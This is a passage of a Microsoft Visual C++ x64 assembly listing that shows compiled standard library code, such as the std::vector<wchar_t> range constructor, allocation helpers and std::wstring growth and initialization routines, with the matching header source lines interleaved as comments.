; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 64
_First$ = 72
_Last$ = 80
_Al$dead$ = 88
??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> ><std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >,0>, COMDAT

; 624  :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

$LN117:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rsi
	push	rdi
	push	r14
	push	r15
	sub	rsp, 32					; 00000020H

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	esi, esi

; 624  :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

	mov	rbx, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	sub	rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR [rcx], rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	mov	r14, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR [rcx+8], rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	sar	r14, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 624  :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

	mov	rdi, rdx
	mov	r15, rcx

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR [rcx+16], rsi

; 2069 :         if (_Count != 0) {

	je	SHORT $LN77@allocator

; 2010 :         if (_Newcapacity > max_size()) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	cmp	r14, rax
	ja	SHORT $LN114@allocator
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 89   :     return _Count * _Ty_size;

	add	r14, r14

; 196  :     if (_Bytes == 0) {

	je	SHORT $LN28@allocator

; 197  :         return nullptr;
; 198  :     }
; 199  : 
; 200  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 201  :     if (_STD is_constant_evaluated()) {
; 202  :         return _Traits::_Allocate(_Bytes);
; 203  :     }
; 204  : #endif // _HAS_CXX20
; 205  : 
; 206  : #ifdef __cpp_aligned_new
; 207  :     if constexpr (_Align > __STDCPP_DEFAULT_NEW_ALIGNMENT__) {
; 208  :         size_t _Passed_align = _Align;
; 209  : #if defined(_M_IX86) || defined(_M_X64)
; 210  :         if (_Bytes >= _Big_allocation_threshold) {
; 211  :             // boost the alignment of big allocations to help autovectorization
; 212  :             _Passed_align = (_STD max)(_Align, _Big_allocation_alignment);
; 213  :         }
; 214  : #endif // defined(_M_IX86) || defined(_M_X64)
; 215  :         return _Traits::_Allocate_aligned(_Bytes, _Passed_align);
; 216  :     } else
; 217  : #endif // defined(__cpp_aligned_new)
; 218  :     {
; 219  : #if defined(_M_IX86) || defined(_M_X64)
; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	r14, 4096				; 00001000H
	jb	SHORT $LN31@allocator

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rcx, QWORD PTR [r14+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rcx, r14
	jbe	SHORT $LN115@allocator

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN41@allocator

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	lea	rsi, QWORD PTR [rax+39]
	and	rsi, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rsi-8], rax

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN28@allocator
$LN31@allocator:

; 101  :         return ::operator new(_Bytes);

	mov	rcx, r14
	call	??2@YAPEAX_K@Z				; operator new
	mov	rsi, rax
$LN28@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR [r15], rsi

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	lea	rcx, QWORD PTR [r14+rsi]
	mov	QWORD PTR [r15+8], rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	mov	QWORD PTR [r15+16], rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rdi
	mov	rcx, rsi
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1822 :                 _Dest += _ULast - _UFirst;

	lea	rcx, QWORD PTR [r14+rsi]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	QWORD PTR [r15+8], rcx
$LN77@allocator:

; 648  :     }

	mov	rbx, QWORD PTR [rsp+72]
	mov	rax, r15
	mov	rsi, QWORD PTR [rsp+80]
	add	rsp, 32					; 00000020H
	pop	r15
	pop	r14
	pop	rdi
	ret	0
$LN41@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN114@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2011 :             _Xlength();

	call	?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ ; std::vector<wchar_t,std::allocator<wchar_t> >::_Xlength
	int	3
$LN115@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN112@allocator:
??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::vector<wchar_t,std::allocator<wchar_t> ><std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@@Z PROC ; std::_Get_unwrapped<std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > > &>, COMDAT

; 1305 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1306 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1307 :         return _It + 0;
; 1308 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1309 :         return static_cast<_Iter&&>(_It)._Unwrapped();

	mov	rax, QWORD PTR [rcx]

; 1310 :     } else {
; 1311 :         return static_cast<_Iter&&>(_It);
; 1312 :     }
; 1313 : }

	ret	0
??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@0@@Z ENDP ; std::_Get_unwrapped<std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > > &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Unfancy_maybe_null@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy_maybe_null@_W@std@@YAPEA_WPEA_W@Z PROC	; std::_Unfancy_maybe_null<wchar_t>, COMDAT

; 47   :     return _Ptr;

	mov	rax, rcx

; 48   : }

	ret	0
??$_Unfancy_maybe_null@_W@std@@YAPEA_WPEA_W@Z ENDP	; std::_Unfancy_maybe_null<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z PROC		; std::move<wchar_t &>, COMDAT

; 1548 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, rcx

; 1549 : }

	ret	0
??$move@AEA_W@std@@YA$$QEA_WAEA_W@Z ENDP		; std::move<wchar_t &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??$_Emplace_one_at_back@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z
_TEXT	SEGMENT
this$ = 8
<_Val_0>$ = 16
??$_Emplace_one_at_back@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t>, COMDAT

; 770  :     _CONSTEXPR20 _Ty& _Emplace_one_at_back(_Valty&&... _Val) {

	mov	r8, rdx

; 771  :         // insert by perfectly forwarding into element at end, provide strong guarantee
; 772  :         auto& _My_data   = _Mypair._Myval2;
; 773  :         pointer& _Mylast = _My_data._Mylast;
; 774  : 
; 775  :         if (_Mylast != _My_data._Myend) {

	mov	rdx, QWORD PTR [rcx+8]
	cmp	rdx, QWORD PTR [rcx+16]
	je	SHORT $LN2@Emplace_on

; 791  :             _Construct_in_place(*_Mylast, _STD forward<_Valty>(_Val)...);

	movzx	eax, WORD PTR [r8]
	mov	WORD PTR [rdx], ax

; 792  :         } else {
; 793  :             _ASAN_VECTOR_EXTEND_GUARD(static_cast<size_type>(_Mylast - _My_data._Myfirst) + 1);
; 794  :             _Alty_traits::construct(_Getal(), _Unfancy(_Mylast), _STD forward<_Valty>(_Val)...);
; 795  :             _ASAN_VECTOR_RELEASE_GUARD;
; 796  :         }
; 797  : 
; 798  :         _Orphan_range(_Mylast, _Mylast);
; 799  :         _Ty& _Result = *_Mylast;

	mov	rax, QWORD PTR [rcx+8]

; 800  :         ++_Mylast;

	lea	rdx, QWORD PTR [rax+2]
	mov	QWORD PTR [rcx+8], rdx

; 780  :     }

	ret	0
$LN2@Emplace_on:

; 776  :             return _Emplace_back_with_unused_capacity(_STD forward<_Valty>(_Val)...);
; 777  :         }
; 778  : 
; 779  :         return *_Emplace_reallocate(_Mylast, _STD forward<_Valty>(_Val)...);

	jmp	??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t>
??$_Emplace_one_at_back@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_W$$QEA_W@Z ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Refancy@PEA_W$0A@@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Refancy@PEA_W$0A@@std@@YAPEA_WPEA_W@Z PROC		; std::_Refancy<wchar_t *,0>, COMDAT

; 272  :     return _Ptr;

	mov	rax, rcx

; 273  : }

	ret	0
??$_Refancy@PEA_W$0A@@std@@YAPEA_WPEA_W@Z ENDP		; std::_Refancy<wchar_t *,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z PROC ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ENDP ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Refancy@PEAD$0A@@std@@YAPEADPEAD@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Refancy@PEAD$0A@@std@@YAPEADPEAD@Z PROC		; std::_Refancy<char *,0>, COMDAT

; 272  :     return _Ptr;

	mov	rax, rcx

; 273  : }

	ret	0
??$_Refancy@PEAD$0A@@std@@YAPEADPEAD@Z ENDP		; std::_Refancy<char *,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z
_TEXT	SEGMENT
_First$dead$ = 8
_Last$dead$ = 16
_Al$dead$ = 24
??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z PROC ; std::_Destroy_range<std::allocator<wchar_t> >, COMDAT

; 1064 :     // note that this is an optimization for debug mode codegen; in release mode the BE removes all of this
; 1065 :     using _Ty = typename _Alloc::value_type;
; 1066 :     if constexpr (!conjunction_v<is_trivially_destructible<_Ty>, _Uses_default_destroy<_Alloc, _Ty*>>) {
; 1067 :         for (; _First != _Last; ++_First) {
; 1068 :             allocator_traits<_Alloc>::destroy(_Al, _STD _Unfancy(_First));
; 1069 :         }
; 1070 :     }
; 1071 : }

	ret	0
??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ENDP ; std::_Destroy_range<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 36   :     return _Ptr;

	mov	rax, rcx

; 37   : }

	ret	0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
_TEXT	SEGMENT
_Obj$dead$ = 8
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z PROC	; std::_Destroy_in_place<wchar_t *>, COMDAT

; 290  :     if constexpr (is_array_v<_Ty>) {
; 291  :         _STD _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 292  :     } else {
; 293  :         _Obj.~_Ty();
; 294  :     }
; 295  : }

	ret	0
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ENDP	; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$addressof@_W@std@@YAPEA_WAEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@_W@std@@YAPEA_WAEA_W@Z PROC		; std::addressof<wchar_t>, COMDAT

; 1560 :     return __builtin_addressof(_Val);

	mov	rax, rcx

; 1561 : }

	ret	0
??$addressof@_W@std@@YAPEA_WAEA_W@Z ENDP		; std::addressof<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@_WAEB_W$0A@@std@@YAPEA_WQEA_WAEB_W@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@_WAEB_W$0A@@std@@YAPEA_WQEA_WAEB_W@Z PROC ; std::construct_at<wchar_t,wchar_t const &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [rcx], ax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@_WAEB_W$0A@@std@@YAPEA_WQEA_WAEB_W@Z ENDP ; std::construct_at<wchar_t,wchar_t const &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ
_TEXT	SEGMENT
this$ = 8
?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ PROC ; std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_Unwrapped, COMDAT

; 2157 :         return const_cast<value_type*>(_STD _Unfancy_maybe_null(this->_Ptr));

	mov	rax, QWORD PTR [rcx]

; 2158 :     }

	ret	0
?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@QEBAPEA_WXZ ENDP ; std::_String_iterator<std::_String_val<std::_Simple_types<wchar_t> > >::_Unwrapped
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEBAPEADXZ
_TEXT	SEGMENT
this$ = 8
?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEBAPEADXZ PROC ; std::_String_iterator<std::_String_val<std::_Simple_types<char> > >::_Unwrapped, COMDAT

; 2157 :         return const_cast<value_type*>(_STD _Unfancy_maybe_null(this->_Ptr));

	mov	rax, QWORD PTR [rcx]

; 2158 :     }

	ret	0
?_Unwrapped@?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@QEBAPEADXZ ENDP ; std::_String_iterator<std::_String_val<std::_Simple_types<char> > >::_Unwrapped
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Requested$ = 8
_Old$ = 16
_Max$ = 24
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	or	rcx, 7
	cmp	rcx, r8

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	ja	SHORT $LN9@Calculate_

; 4765 :             return _Max;
; 4766 :         }
; 4767 : 
; 4768 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

	mov	r9, rdx
	mov	rax, r8
	shr	r9, 1
	sub	rax, r9
	cmp	rdx, rax
	ja	SHORT $LN9@Calculate_

; 4772 :         return (_STD max)(_Masked, _Old + _Old / 2);

	lea	rax, QWORD PTR [r9+rdx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmp	rcx, rax
	cmovb	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4772 :         return (_STD max)(_Masked, _Old + _Old / 2);

	mov	rax, rcx

; 4773 :     }

	ret	0
$LN9@Calculate_:

; 4769 :             return _Max;

	mov	rax, r8

; 4773 :     }

	ret	0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$dead$ = 8
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4171 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());
; 4172 :         const size_type _Storage_max = // can always store small string
; 4173 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4174 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

	mov	rax, 9223372036854775806		; 7ffffffffffffffeH

; 4175 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4176 :         );
; 4177 :     }

	ret	0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 8
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty, COMDAT

; 2647 :         auto& _My_data = _Mypair._Myval2;
; 2648 :         _My_data._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));
; 2649 : 
; 2650 :         // initialize basic_string data members
; 2651 :         _My_data._Mysize = 0;

	xor	eax, eax

; 2652 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rcx+24], 7
	mov	QWORD PTR [rcx+16], rax

; 2653 :         _My_data._Activate_SSO_buffer();
; 2654 : 
; 2655 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2656 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR [rcx], ax

; 2657 :     }

	ret	0
?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

	xor	eax, eax
	xorps	xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR [rcx], xmm0

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
